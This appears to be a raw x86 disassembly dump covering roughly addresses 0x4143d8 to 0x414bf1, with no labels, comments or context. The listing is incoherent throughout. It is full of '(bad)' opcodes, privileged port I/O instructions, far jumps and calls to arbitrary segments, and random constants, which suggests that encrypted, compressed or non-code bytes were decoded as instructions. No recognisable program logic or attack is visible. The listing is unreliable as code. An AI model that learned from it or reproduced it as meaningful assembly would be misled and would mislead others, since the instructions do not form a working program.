  4143d8:	dec    ebx
  4143d9:	pop    es
  4143da:	popf   
  4143db:	mov    dl,dl
  4143dd:	or     DWORD PTR [edi+ecx*8+0x2aeda1e0],esp
  4143e4:	addr16 nop
  4143e6:	jbe    0x414384
  4143e8:	scas   eax,DWORD PTR es:[edi]
  4143e9:	mov    cl,0x58
  4143eb:	imul   esi,DWORD PTR [edi-0x2f],0xd7db8c1f
  4143f2:	xor    DWORD PTR [edi+0x580903b7],ebx
  4143f8:	cmp    eax,0xc5ebb576
  4143fd:	push   ecx
  4143fe:	jle    0x414455
  414400:	(bad)  
  414401:	(bad)  
  414402:	jecxz  0x41441e
  414404:	fwait
  414405:	mov    WORD PTR [ebx+0x6d],es
  414408:	mov    dl,BYTE PTR [eax]
  41440a:	rcr    DWORD PTR [ebx+ebx*2],0x88
  41440e:	push   edx
  41440f:	sub    eax,0x2e61d63c
  414414:	imul   ecx,DWORD PTR [ebx+0x1b],0xc1483a49
  41441b:	push   cs
  41441c:	cmp    DWORD PTR [ecx-0x23e67b3e],ebp
  414422:	shr    eax,1
  414424:	cmp    eax,0xff8194a4
  414429:	sub    BYTE PTR ds:0x56e30baf,al
  41442f:	cmp    edi,ecx
  414431:	pop    eax
  414432:	xchg   ch,ch
  414434:	jmp    0x325b:0xd9a2d7bd
  41443b:	dec    esi
  41443c:	sbb    ecx,DWORD PTR [edi]
  41443e:	(bad)  
  41443f:	push   esp
  414441:	neg    BYTE PTR [ebx-0x55831ef3]
  414447:	sahf   
  414448:	js     0x41445d
  41444a:	jmp    0x21960483
  41444f:	in     al,0xa3
  414451:	sub    BYTE PTR [esi+0x42],cl
  414454:	pop    esi
  414455:	xor    eax,0x96e7653e
  41445a:	not    DWORD PTR [ecx]
  41445c:	mov    WORD PTR [edi+0x46],gs
  41445f:	aaa    
  414460:	lock inc ecx
  414462:	mov    bl,0xa8
  414464:	call   0xc3b9764d
  414469:	out    0x0,eax
  41446b:	jl     0x41448e
  41446d:	mov    edi,0xa08ae90b
  414472:	dec    edx
  414473:	ret    
  414474:	popf   
  414475:	and    DWORD PTR [eax+0x3f92412a],esp
  41447b:	fsub   QWORD PTR [edx-0x71]
  41447e:	jg     0x41443d
  414480:	sub    ebx,DWORD PTR [edx-0x1078dd85]
  414486:	add    eax,0x7ebca268
  41448b:	mov    ds:0xcc8cbe0a,al
  414490:	or     DWORD PTR [ebp+0x2856ccaa],ebp
  414496:	xchg   edi,eax
  414497:	lock div BYTE PTR [esi+0x1f099b29]
  41449e:	shl    DWORD PTR [ebp-0x49],cl
  4144a1:	pop    ecx
  4144a2:	pushf  
  4144a3:	(bad)  [ebp-0x6239cf62]
  4144a9:	loope  0x414452
  4144ab:	pusha  
  4144ac:	xor    al,0xbf
  4144ae:	inc    ecx
  4144af:	js     0x414477
  4144b1:	add    ecx,esp
  4144b3:	and    BYTE PTR [esi+eiz*8],0x91
  4144b7:	enter  0xfbe0,0xb
  4144bb:	jecxz  0x4144c0
  4144bd:	into   
  4144be:	jl     0x4144f3
  4144c0:	addps  xmm1,xmm4
  4144c3:	mov    DWORD PTR [esi+ebx*2-0x25176812],ecx
  4144ca:	adc    BYTE PTR [ecx+0x1d1106ae],dl
  4144d0:	sub    esp,DWORD PTR [ecx]
  4144d2:	xchg   ecx,eax
  4144d3:	ficom  WORD PTR [eax]
  4144d5:	rep outs dx,DWORD PTR ds:[esi]
  4144d7:	pop    ss
  4144d8:	jl     0x414489
  4144da:	inc    esi
  4144db:	adc    eax,0xe86031d1
  4144e0:	jle    0x414524
  4144e2:	add    ecx,DWORD PTR [ebx-0x40]
  4144e5:	cmp    al,0x4
  4144e7:	nop
  4144e8:	daa    
  4144e9:	cmp    eax,0x64956898
  4144ee:	fimul  DWORD PTR ds:0x6f7106a3
  4144f4:	mov    ds:0x726e542a,al
  4144f9:	fisttp DWORD PTR [ebx+0x3f28cba1]
  4144ff:	les    ebx,FWORD PTR [ebx+0x77ff68d4]
  414505:	push   0xffffffb0
  414507:	stos   BYTE PTR es:[edi],al
  414508:	stos   DWORD PTR es:[edi],eax
  414509:	or     eax,0x1ce9e1a
  41450e:	fnstenv [esi+0x6375b352]
  414514:	cmp    eax,0x1ed900a7
  414519:	fcomp  st(2)
  41451b:	stos   DWORD PTR es:[edi],eax
  41451c:	or     esp,DWORD PTR [edi]
  41451e:	mov    ebx,0x10429e6f
  414523:	add    al,0x5a
  414525:	in     eax,0xbe
  414527:	sbb    esi,DWORD PTR [edx-0x39ec6e38]
  41452d:	xchg   edi,eax
  41452e:	dec    ebp
  41452f:	pushf  
  414530:	and    ch,BYTE PTR [ecx+0x6]
  414533:	cmp    dh,BYTE PTR ds:0x34fc060d
  414539:	into   
  41453a:	pop    esi
  41453b:	add    esi,DWORD PTR [esi+0xb]
  41453e:	in     eax,0x6b
  414540:	jmp    0x84d7:0x4e49
  414546:	out    dx,al
  414547:	stc    
  414548:	cdq    
  414549:	ins    BYTE PTR es:[edi],dx
  41454a:	push   0xaf2ae677
  41454f:	stc    
  414550:	shl    edi,0x6
  414553:	pusha  
  414554:	mov    ah,0xa8
  414556:	add    edi,DWORD PTR [edi+0x64b603ab]
  41455c:	jmp    0x41458a
  41455e:	add    DWORD PTR [ecx-0x3516b26f],0xdfa57aa7
  414568:	sub    esi,DWORD PTR [ebx-0xf2b15d2]
  41456e:	mov    esp,0x8aabd5f2
  414573:	test   al,0x6f
  414575:	sahf   
  414576:	(bad)  
  414578:	shl    DWORD PTR [ebp+0x27b696eb],1
  41457e:	in     al,dx
  41457f:	xchg   ecx,eax
  414580:	adc    dl,BYTE PTR [esi+0xa852d0f]
  414586:	ficom  DWORD PTR [eax-0x33]
  414589:	push   ecx
  41458a:	sub    edi,DWORD PTR [eax+edi*1]
  41458d:	xchg   edx,eax
  41458e:	jg     0x414519
  414590:	mov    al,ds:0xcbf7844a
  414595:	fistp  QWORD PTR [edx-0x37]
  414598:	aam    0x2
  41459a:	outs   dx,BYTE PTR ds:[esi]
  41459b:	sub    DWORD PTR [edx],esi
  41459d:	sbb    ch,dl
  41459f:	xchg   ebp,eax
  4145a0:	ror    DWORD PTR [ebx+eax*2],cl
  4145a3:	ins    BYTE PTR es:[edi],dx
  4145a4:	inc    edi
  4145a5:	dec    ebx
  4145a6:	adc    DWORD PTR ds:0x17b35d8d,0x5a
  4145ad:	popf   
  4145ae:	gs xor eax,0xeff79072
  4145b4:	call   0xb911:0x9050da6
  4145bb:	cmc    
  4145bc:	loopne 0x4145d7
  4145be:	outs   dx,BYTE PTR ds:[esi]
  4145bf:	je     0x41461f
  4145c1:	js     0x4145e3
  4145c3:	nop
  4145c4:	fcomp  DWORD PTR [edx-0x7e]
  4145c7:	icebp  
  4145c8:	shl    DWORD PTR [ebx+0x4],1
  4145cb:	xor    dl,dh
  4145cd:	or     ch,BYTE PTR [ebp-0x5a41a0cb]
  4145d3:	pop    esi
  4145d4:	out    dx,eax
  4145d5:	push   ds
  4145d6:	add    al,0x9
  4145d8:	int3   
  4145d9:	mov    ?,WORD PTR [edi]
  4145db:	and    al,0xe2
  4145dd:	pop    ds
  4145de:	pop    edi
  4145df:	pop    eax
  4145e0:	pop    es
  4145e1:	mov    esi,0x25448ef0
  4145e6:	cld    
  4145e7:	dec    eax
  4145e8:	rol    DWORD PTR [edi],0x54
  4145eb:	aaa    
  4145ec:	(bad)  
  4145ed:	outs   dx,BYTE PTR ds:[esi]
  4145ee:	stc    
  4145ef:	pusha  
  4145f0:	cmp    al,0x8f
  4145f2:	jb     0x414597
  4145f4:	sbb    DWORD PTR [edi-0x1a],edx
  4145f7:	jb     0x4145a8
  4145f9:	call   0xed29998d
  4145fe:	mov    al,0xd0
  414600:	shl    ebp,0xb
  414603:	(bad)  
  414604:	push   edx
  414605:	test   BYTE PTR [ecx+ecx*2-0x5f],0x91
  41460a:	adc    BYTE PTR [esi-0x11691338],dl
  414610:	adc    BYTE PTR [edi-0x78],bl
  414613:	pop    esp
  414614:	stos   BYTE PTR es:[edi],al
  414615:	xor    eax,eax
  414617:	jl     0x41461a
  414619:	popa   
  41461a:	outs   dx,DWORD PTR ds:[esi]
  41461b:	cmp    ebx,DWORD PTR [ebx]
  41461d:	inc    eax
  41461e:	xor    ebp,DWORD PTR [eax]
  414620:	jno    0x4145a9
  414622:	xor    DWORD PTR [edx-0x7e83a20d],ecx
  414628:	pop    edi
  414629:	push   ebp
  41462a:	dec    edi
  41462b:	fimul  DWORD PTR [ebx+0x183e5e8d]
  414631:	mov    al,ds:0xa0955b86
  414636:	mov    ds:0x52627dcc,eax
  41463b:	pop    ecx
  41463c:	ret    0xa7bf
  41463f:	into   
  414640:	sub    DWORD PTR [ecx+0x790ae3e8],0x7a
  414647:	lock iret 
  414649:	loopne 0x4145fe
  41464b:	aad    0x80
  41464d:	in     eax,dx
  41464e:	and    cl,BYTE PTR [esi+0x64228999]
  414654:	(bad)  
  414655:	call   0x7046:0xc3807a34
  41465c:	daa    
  41465d:	or     edx,DWORD PTR [ecx-0x41bbdecb]
  414663:	dec    edi
  414664:	adc    eax,0x777a79e7
  414669:	xor    BYTE PTR [ebx+edx*4-0x13065713],ch
  414670:	pop    esi
  414671:	push   eax
  414672:	stc    
  414673:	clc    
  414674:	pop    ss
  414675:	popa   
  414676:	push   cs
  414677:	inc    esp
  414678:	mov    bl,0xf7
  41467a:	fbstp  TBYTE PTR [bx]
  41467d:	pushf  
  41467e:	pop    ebp
  41467f:	push   ds
  414680:	or     eax,0xcef26f2c
  414685:	push   ebx
  414686:	xor    edi,DWORD PTR [edx+ecx*4]
  414689:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41468a:	fiadd  DWORD PTR [esi]
  41468c:	push   ds
  41468d:	imul   eax,DWORD PTR [eax],0x882361e2
  414693:	push   es
  414694:	sub    dh,al
  414696:	outs   dx,BYTE PTR ds:[esi]
  414697:	fcom   QWORD PTR [esp+ebx*1-0x6c1a26be]
  41469e:	ret    
  41469f:	or     edi,DWORD PTR ds:0x9020aaaa
  4146a5:	or     DWORD PTR [edx-0x2f],edi
  4146a8:	inc    eax
  4146a9:	or     BYTE PTR [esi+0x4a995d73],ah
  4146af:	mov    ds:0x8317f1ce,al
  4146b4:	dec    DWORD PTR [eax]
  4146b6:	dec    ecx
  4146b7:	cmp    BYTE PTR [edi],dl
  4146b9:	push   esp
  4146ba:	aaa    
  4146bb:	push   0x7af4115c
  4146c0:	bound  edx,QWORD PTR [eax+0x10d9f1af]
  4146c6:	out    0x12,al
  4146c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c9:	xor    al,0xf6
  4146cb:	sub    eax,0x14559655
  4146d0:	add    BYTE PTR [ebx-0x710e2328],ch
  4146d6:	mov    ds:0xb18aae98,al
  4146db:	shl    BYTE PTR [ebx+ebx*1],1
  4146de:	dec    ecx
  4146df:	xchg   DWORD PTR [eax-0x230a5fb8],ebx
  4146e5:	out    0x47,al
  4146e7:	xchg   esp,eax
  4146e8:	stc    
  4146e9:	imul   edx,DWORD PTR [ebp+0x224d0e81],0xf7d0c4b8
  4146f3:	jle    0x414678
  4146f5:	cld    
  4146f6:	cs popa 
  4146f8:	loope  0x4146ca
  4146fa:	clc    
  4146fb:	sbb    eax,0x58330f00
  414700:	sti    
  414701:	and    eax,0x97b0981
  414706:	popf   
  414707:	rcl    BYTE PTR [eax+0x5e13a3ec],1
  41470d:	in     al,0x5f
  41470f:	cdq    
  414710:	loope  0x414782
  414712:	pusha  
  414713:	imul   esi,ecx,0x561ec491
  414719:	or     BYTE PTR [edi+0x45],cl
  41471c:	sbb    ch,BYTE PTR [ecx+0x2baa33e5]
  414722:	arpl   WORD PTR [edi+ebx*8-0x2d0d7db8],bp
  414729:	sar    BYTE PTR [ebx+0x4b7f701d],cl
  41472f:	jnp    0x4146dc
  414731:	dec    ebp
  414732:	inc    ebx
  414733:	or     BYTE PTR [edi+0x72c71582],cl
  414739:	bound  ebp,QWORD PTR [edx+0x4d53d9ab]
  41473f:	sub    eax,0x9cd6c806
  414744:	or     esp,0x1272b0d4
  41474a:	sub    cl,BYTE PTR [esi+0x172e410c]
  414750:	cli    
  414751:	cs pusha 
  414753:	stc    
  414754:	xor    bh,BYTE PTR [eax+0x39d6f4fa]
  41475a:	adc    al,0x3c
  41475c:	inc    ecx
  41475d:	jae    0x4147be
  41475f:	and    edi,edi
  414761:	and    dl,BYTE PTR [ecx+0x4ffd51cd]
  414767:	call   0x1ab5fc57
  41476c:	in     eax,dx
  41476d:	xor    esp,DWORD PTR [bx+di-0x2643]
  414772:	fdivrp st(0),st
  414774:	xchg   ebx,eax
  414775:	push   edi
  414776:	or     eax,0x9204cd12
  41477b:	push   edx
  41477c:	mov    esi,0x99b76556
  414781:	loope  0x414704
  414783:	dec    esp
  414784:	mov    BYTE PTR [ebp+0x7e557856],dh
  41478a:	lods   eax,DWORD PTR ds:[esi]
  41478b:	imul   ebx,DWORD PTR [edi-0x7c],0x16
  41478f:	scas   eax,DWORD PTR es:[edi]
  414790:	push   edi
  414791:	xchg   ebx,eax
  414792:	sti    
  414793:	cdq    
  414794:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414795:	xchg   ebp,eax
  414796:	sbb    edi,DWORD PTR [ecx]
  414798:	jl     0x4147df
  41479a:	mov    ecx,0x16eebb56
  41479f:	enter  0x6947,0x8e
  4147a3:	call   0xa083372f
  4147a8:	retf   0xff60
  4147ab:	ds mov ecx,0x936b4160
  4147b1:	or     bl,dl
  4147b3:	sbb    al,0x57
  4147b5:	cli    
  4147b6:	sub    DWORD PTR [edx+0x1a],ebp
  4147b9:	cs dec ecx
  4147bb:	icebp  
  4147bc:	inc    esi
  4147bd:	fldz   
  4147bf:	jecxz  0x41478e
  4147c1:	pop    edi
  4147c2:	mov    edx,ebx
  4147c4:	xchg   ecx,eax
  4147c5:	add    al,0xc9
  4147c7:	inc    edx
  4147c8:	dec    esi
  4147c9:	and    ah,BYTE PTR [edx+0x9]
  4147cc:	pop    ss
  4147cd:	push   ebp
  4147ce:	neg    DWORD PTR [ebx+0x72b881d4]
  4147d4:	(bad)  [esi-0x377051b2]
  4147da:	add    BYTE PTR [esi],0x77
  4147dd:	jb     0x414766
  4147df:	dec    edx
  4147e0:	mov    esp,0x54703e89
  4147e5:	pop    ebp
  4147e6:	(bad)  [eax+ebx*2+0x2a]
  4147ea:	jecxz  0x4147ae
  4147ec:	in     eax,0x2a
  4147ee:	dec    edi
  4147ef:	inc    esp
  4147f0:	leave  
  4147f1:	ret    0x1667
  4147f4:	fwait
  4147f5:	cmp    DWORD PTR [ebx+0x71],0xa7224481
  4147fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147fd:	cmp    bl,dh
  4147ff:	test   al,0xbf
  414801:	xchg   esp,eax
  414802:	mov    ds:0x8eb140a2,eax
  414807:	lock pusha 
  414809:	xchg   ebx,eax
  41480a:	mov    al,ds:0x7d29dc09
  41480f:	xor    al,dl
  414811:	clc    
  414812:	xor    eax,0x40c89958
  414817:	fidivr WORD PTR [ebx-0x78836f69]
  41481d:	push   0x3f9209f7
  414822:	mov    eax,0x64a474e9
  414827:	push   edx
  414828:	in     al,0x9b
  41482a:	sbb    ebp,edi
  41482c:	inc    esp
  41482d:	jo     0x4147b7
  41482f:	push   esi
  414830:	mov    eax,0xeda35035
  414835:	jmp    0x414871
  414837:	mov    edi,DWORD PTR [ecx-0x42e864b5]
  41483d:	psubd  mm2,QWORD PTR [esi+0x214b66a9]
  414844:	sbb    DWORD PTR [ecx],0x27
  414847:	sqrtps xmm5,XMMWORD PTR [eax]
  41484a:	dec    eax
  41484b:	retf   0x10
  41484e:	sub    DWORD PTR [ebp+0x59e1d60f],esi
  414854:	push   ebx
  414855:	les    ebx,FWORD PTR [ecx]
  414857:	scas   eax,DWORD PTR es:[edi]
  414858:	mov    ecx,0x4db79138
  41485d:	mov    dl,0xd
  41485f:	sbb    eax,0x4ee6cf43
  414864:	push   ss
  414865:	jl     0x41484a
  414867:	push   edx
  414868:	aaa    
  414869:	(bad)  
  41486a:	enter  0xf74f,0xa6
  41486e:	clc    
  41486f:	dec    ecx
  414870:	arpl   WORD PTR [eax+0x291cf2fe],di
  414876:	sahf   
  414877:	sbb    cl,BYTE PTR [edx+0x59]
  41487a:	mov    cl,al
  41487c:	push   edi
  41487d:	push   esp
  41487e:	push   edi
  41487f:	aad    0x29
  414881:	dec    ebx
  414882:	pop    eax
  414883:	adc    DWORD PTR [ecx],0xb30cfb99
  414889:	inc    ebx
  41488a:	std    
  41488b:	inc    edi
  41488c:	and    al,0xab
  41488e:	mov    ds:0x938d367b,eax
  414893:	lods   al,BYTE PTR ds:[esi]
  414894:	not    BYTE PTR [ecx]
  414896:	bnd ja 0x414907
  414899:	popf   
  41489a:	or     eax,ecx
  41489c:	add    BYTE PTR [ecx-0x7eaf4d79],cl
  4148a2:	fs cmp al,0x4a
  4148a5:	jle    0x414890
  4148a7:	fs icebp 
  4148a9:	xor    al,0x5c
  4148ab:	xchg   edx,eax
  4148ac:	xchg   ebx,eax
  4148ad:	mov    esp,0x5ddd7646
  4148b2:	shl    eax,cl
  4148b4:	retf   0x319e
  4148b7:	not    BYTE PTR [esi+ebp*4-0x790faceb]
  4148be:	mov    ebp,0xb438a28f
  4148c3:	mov    dl,0x9c
  4148c5:	mov    ebx,0x2f749b80
  4148ca:	dec    ebx
  4148cb:	sar    BYTE PTR [eax+esi*4],cl
  4148ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148cf:	mov    dl,0x12
  4148d1:	les    ebp,FWORD PTR [esi-0x70]
  4148d4:	mov    dh,0x10
  4148d6:	jb     0x4148f9
  4148d8:	sub    BYTE PTR [ebx],dh
  4148da:	cmp    eax,0x79e068b3
  4148df:	retf   
  4148e0:	or     al,0x19
  4148e2:	cmp    ecx,DWORD PTR [eax+edi*2-0x3d]
  4148e6:	fnstcw WORD PTR [esi+0x5425fb0e]
  4148ec:	(bad)  
  4148ed:	ins    DWORD PTR es:[edi],dx
  4148ee:	mov    ebx,0x68ba6a6d
  4148f3:	jge    0x414944
  4148f5:	mov    esp,0x20d569ba
  4148fa:	sbb    ecx,DWORD PTR [edx+0x4b]
  4148fd:	jns    0x4148b1
  4148ff:	or     ecx,DWORD PTR [eax+0x62fe32db]
  414905:	gs dec edx
  414907:	xchg   ebp,eax
  414908:	pusha  
  414909:	enter  0x788,0x39
  41490d:	ins    BYTE PTR es:[edi],dx
  41490e:	inc    esp
  41490f:	outs   dx,DWORD PTR ds:[esi]
  414910:	ins    BYTE PTR es:[edi],dx
  414911:	xchg   BYTE PTR [edi],cl
  414913:	adc    ebx,DWORD PTR [ecx]
  414915:	mov    WORD PTR [esi+0x1c286245],gs
  41491b:	pop    ebx
  41491c:	shr    DWORD PTR [ebx+eax*1+0x45],cl
  414920:	leave  
  414921:	xchg   DWORD PTR [ecx-0x11],esi
  414924:	inc    edi
  414925:	in     eax,0x83
  414927:	jmp    0x414986
  414929:	repz mov ah,0xe2
  41492c:	popa   
  41492d:	sub    eax,0x75b64076
  414932:	pop    ecx
  414933:	mov    edi,0x12f4d4c3
  414938:	xchg   dh,ch
  41493a:	pop    edx
  41493b:	shl    ah,1
  41493d:	mov    BYTE PTR [ecx+0x2d],bl
  414940:	or     eax,0xdc713956
  414945:	xchg   esp,eax
  414946:	int    0x30
  414948:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414949:	sbb    edx,DWORD PTR [ecx-0x562e3074]
  41494f:	inc    esp
  414950:	shl    BYTE PTR [eax-0x14],1
  414953:	sbb    eax,0x3416b1d
  414958:	pop    eax
  41495a:	cwde   
  41495b:	sahf   
  41495c:	mov    dl,0xdc
  41495e:	in     al,dx
  41495f:	pop    ebp
  414960:	popa   
  414961:	cdq    
  414962:	inc    edx
  414963:	xchg   esp,eax
  414964:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414965:	push   ecx
  414966:	mov    ah,0x90
  414968:	imul   ebp,DWORD PTR [edi+0xfcbd0e3],0x3e
  41496f:	rcr    DWORD PTR ds:0x28c5d200,1
  414975:	div    al
  414977:	xor    BYTE PTR [ebx-0x51],bl
  41497a:	and    BYTE PTR [ebp+0x3e],0x7f
  41497e:	dec    esp
  41497f:	fidivr WORD PTR [ebx]
  414981:	add    al,0x5b
  414983:	je     0x414924
  414985:	xchg   esp,eax
  414986:	push   ds
  414987:	(bad)  
  414988:	pop    ebx
  414989:	cmp    BYTE PTR [eax+ecx*1],ch
  41498c:	loopne 0x414a04
  41498e:	and    ecx,DWORD PTR ds:0xee41f9a8
  414994:	arpl   WORD PTR [ebx+0x4a20fb1f],di
  41499a:	sbb    ch,bh
  41499c:	mov    edi,0x836186a5
  4149a1:	inc    eax
  4149a2:	xchg   ebx,eax
  4149a3:	imul   edi,DWORD PTR [esp+esi*8-0x36bba0cd],0x3c
  4149ab:	cmp    DWORD PTR [esi+0x2f613f7e],ebp
  4149b1:	in     al,0xef
  4149b3:	sti    
  4149b4:	inc    edi
  4149b5:	ret    0x470a
  4149b8:	add    al,0xb2
  4149ba:	cmp    al,0x31
  4149bc:	xor    edi,esi
  4149be:	lahf   
  4149bf:	dec    edx
  4149c0:	gs (bad) 
  4149c3:	out    dx,al
  4149c4:	and    ch,dl
  4149c6:	cmp    eax,0xebe4b42c
  4149cb:	jmp    0xbd4f:0x7de94875
  4149d2:	jle    0x41498b
  4149d4:	rol    esi,0xa8
  4149d7:	test   eax,0x7644a575
  4149dc:	lock ss xchg ebp,eax
  4149df:	add    ch,0xef
  4149e2:	sub    DWORD PTR [ecx-0x1f09eedc],esp
  4149e8:	ror    DWORD PTR [eax+edx*2+0x9e562b5],cl
  4149ef:	outs   dx,DWORD PTR ds:[esi]
  4149f0:	jo     0x4149d5
  4149f2:	aam    0x22
  4149f4:	mov    DWORD PTR [esi],edi
  4149f6:	xor    al,0xa5
  4149f8:	dec    edi
  4149f9:	push   ebp
  4149fa:	mov    ds:0x5ace0b1a,eax
  4149ff:	and    bh,BYTE PTR [esi-0x39e37a6b]
  414a05:	sbb    BYTE PTR [ebp+0x2839d8a9],dl
  414a0b:	inc    edx
  414a0c:	jns    0x414a8a
  414a0e:	pop    edi
  414a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a10:	dec    esi
  414a11:	cmp    eax,edx
  414a13:	xor    bh,BYTE PTR [edx-0x5a]
  414a16:	sbb    al,0xc3
  414a18:	cs mov bl,0xcd
  414a1b:	cld    
  414a1c:	mov    esi,0x9e57cbfb
  414a21:	int3   
  414a22:	mul    BYTE PTR [edx-0x4c]
  414a25:	pop    ebp
  414a26:	sub    eax,0xe6d469e1
  414a2c:	and    al,0x8e
  414a2e:	std    
  414a2f:	and    eax,0xbd8b7f62
  414a34:	jl     0x414a08
  414a36:	idiv   BYTE PTR [ebx-0x2fd66534]
  414a3c:	enter  0xd293,0x6e
  414a40:	je     0x414a10
  414a42:	loop   0x4149cb
  414a44:	xor    dl,BYTE PTR [ebx+eiz*1+0x60b88657]
  414a4b:	cmp    DWORD PTR [edx],eax
  414a4d:	fild   DWORD PTR [edi]
  414a4f:	fcomi  st,st(2)
  414a51:	sbb    BYTE PTR [ebp+ebp*4-0x71],ch
  414a55:	enter  0x9a75,0x7a
  414a59:	imul   ebx,esi,0x4cb2e2f9
  414a5f:	sbb    eax,0xa04ac31c
  414a64:	pop    esp
  414a65:	inc    esp
  414a66:	sub    ebp,esp
  414a68:	pop    ss
  414a69:	xor    al,0x83
  414a6b:	fiadd  WORD PTR [eax-0x8323c7b]
  414a71:	xor    ebp,esp
  414a73:	mov    DWORD PTR [esi+0x53],ecx
  414a76:	(bad)  
  414a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a78:	mov    al,0xab
  414a7a:	sbb    BYTE PTR [ebx],bh
  414a7c:	stos   BYTE PTR es:[edi],al
  414a7d:	push   0x95d1fc35
  414a82:	iret   
  414a83:	xor    esi,DWORD PTR [edx]
  414a85:	jge    0x414a71
  414a87:	and    DWORD PTR [eax+ebx*1],ebp
  414a8a:	mov    cl,0xbc
  414a8c:	mov    cl,0xa5
  414a8e:	and    BYTE PTR [eax],dh
  414a90:	jl     0x414ad0
  414a92:	mov    cl,0x7e
  414a94:	mov    cl,0x5a
  414a96:	push   eax
  414a97:	out    0x8e,al
  414a99:	cmc    
  414a9a:	pop    ebx
  414a9b:	push   ebx
  414a9c:	and    ch,bh
  414a9e:	shr    BYTE PTR ds:[ebx-0x61f8cf53],cl
  414aa5:	xchg   al,al
  414aa7:	jne    0x414ac6
  414aa9:	and    dh,BYTE PTR [edx]
  414aab:	jp     0x414a46
  414aad:	or     BYTE PTR [eax+0x44],cl
  414ab0:	and    eax,ecx
  414ab2:	pop    eax
  414ab3:	scas   eax,DWORD PTR es:[edi]
  414ab4:	(bad)
  414ab8:	mov    cs,WORD PTR [ebp-0x47]
  414abb:	gs xor eax,0xe6637288
  414ac1:	lds    eax,FWORD PTR [eax]
  414ac3:	adc    al,0x4a
  414ac5:	je     0x414b42
  414ac7:	in     al,dx
  414ac8:	xor    BYTE PTR [ebx+0x7499768c],ah
  414ace:	fisttp DWORD PTR [ecx]
  414ad0:	(bad)  
  414ad1:	cmp    DWORD PTR [eax+0x6c54e63e],esp
  414ad7:	sub    ecx,DWORD PTR [ebx+0x5]
  414ada:	mov    cs,WORD PTR [ebp-0x5ab61e33]
  414ae0:	dec    ebx
  414ae1:	sub    DWORD PTR [esi],0x16e7feba
  414ae7:	imul   ebx,DWORD PTR [edi+0x656e3acf],0x666aae09
  414af1:	cmp    al,0x7e
  414af3:	shr    BYTE PTR [esi-0x22],cl
  414af6:	sti    
  414af7:	(bad)  
  414af8:	mov    edi,0xe26e9b14
  414afd:	aas    
  414afe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414aff:	out    dx,al
  414b00:	in     eax,0x8
  414b02:	xchg   DWORD PTR [ebp-0x7d],ebx
  414b05:	and    al,0x94
  414b07:	ret    
  414b08:	gs sbb al,0xb3
  414b0b:	cld    
  414b0c:	jmp    0xb8bf:0x92c16e2e
  414b13:	xchg   ebx,eax
  414b14:	call   0xa0d5:0x51babc45
  414b1b:	out    0x53,eax
  414b1d:	adc    eax,0xa2ed898c
  414b22:	adc    BYTE PTR [esi],ch
  414b24:	push   ebx
  414b25:	jp     0x414b05
  414b27:	cmovle esi,edx
  414b2a:	bts    DWORD PTR [ebp-0x34],eax
  414b2e:	inc    ebp
  414b2f:	inc    ecx
  414b30:	vpperm ymm2,ymm0,YMMWORD PTR [edx+0x5],ymm2
  414b37:	pop    ecx
  414b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b39:	(bad)  
  414b3a:	lods   eax,DWORD PTR ds:[esi]
  414b3b:	inc    esi
  414b3c:	ror    edi,cl
  414b3e:	inc    esi
  414b3f:	push   esp
  414b40:	adc    dl,BYTE PTR [edi+0x394794a2]
  414b46:	push   edx
  414b47:	test   BYTE PTR [ecx+0x70],dl
  414b4a:	rcr    DWORD PTR [ebp+0x1f4f6bab],1
  414b50:	scas   eax,DWORD PTR es:[edi]
  414b51:	add    BYTE PTR [edi-0x3e],dl
  414b54:	cwde   
  414b55:	sbb    BYTE PTR [ebx],bh
  414b57:	push   edx
  414b58:	(bad)  
  414b59:	sbb    esp,edx
  414b5b:	sub    esp,DWORD PTR [ebp-0xe2f4549]
  414b61:	mov    al,0x3e
  414b63:	and    al,0x3e
  414b65:	push   ebx
  414b66:	mov    bh,0x64
  414b68:	xchg   DWORD PTR [esi-0x1a],ebx
  414b6b:	sbb    cl,ah
  414b6d:	add    BYTE PTR [eax],al
  414b6f:	mov    esp,ebx
  414b71:	jb     0x414b40
  414b73:	icebp  
  414b74:	jmp    0x414b02
  414b76:	jl     0x414b94
  414b78:	jmp    0x414bed
  414b7a:	ret    0x9c0c
  414b7d:	or     BYTE PTR [edx+eiz*2-0x2e26e7bb],0xd4
  414b85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b86:	or     ah,BYTE PTR [edi+0x114189b1]
  414b8c:	and    dl,BYTE PTR [ecx-0x10]
  414b8f:	cmp    esi,DWORD PTR [edx-0x7511347c]
  414b95:	ins    DWORD PTR es:[edi],dx
  414b96:	dec    esp
  414b97:	lahf   
  414b98:	not    BYTE PTR [ebx-0x24]
  414b9b:	mov    al,ds:0xa6e6cf8
  414ba0:	out    dx,al
  414ba1:	nop
  414ba2:	retf   
  414ba3:	push   DWORD PTR ds:0x79b30724
  414ba9:	retf   0x1219
  414bac:	retf   0x9b93
  414baf:	jle    0x414c1e
  414bb1:	pop    edi
  414bb2:	sahf   
  414bb3:	mov    ebp,0xf934d220
  414bb8:	cmp    BYTE PTR [ebx-0x7b],0x17
  414bbc:	dec    esi
  414bbd:	std    
  414bbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bbf:	push   ds
  414bc0:	jecxz  0x414be8
  414bc2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414bc3:	rcr    BYTE PTR [ebx+eiz*4+0x49],cl
  414bc7:	fist   WORD PTR [esi+0x5e]
  414bca:	js     0x414be6
  414bcc:	outs   dx,DWORD PTR ds:[esi]
  414bcd:	call   0x6173:0x468a4f3e
  414bd4:	stc    
  414bd5:	jp     0x414b74
  414bd7:	sbb    BYTE PTR ds:0x255f6035,ch
  414bdd:	pusha  
  414bde:	popf   
  414bdf:	push   esi
  414be0:	mov    WORD PTR [eax+0x57],gs
  414be3:	lock dec eax
  414be5:	push   0xd1a86a62
  414bea:	push   0x66
  414bec:	repz out 0x8e,eax
  414bef:	or     al,0x46
  414bf1:	inc    ebp
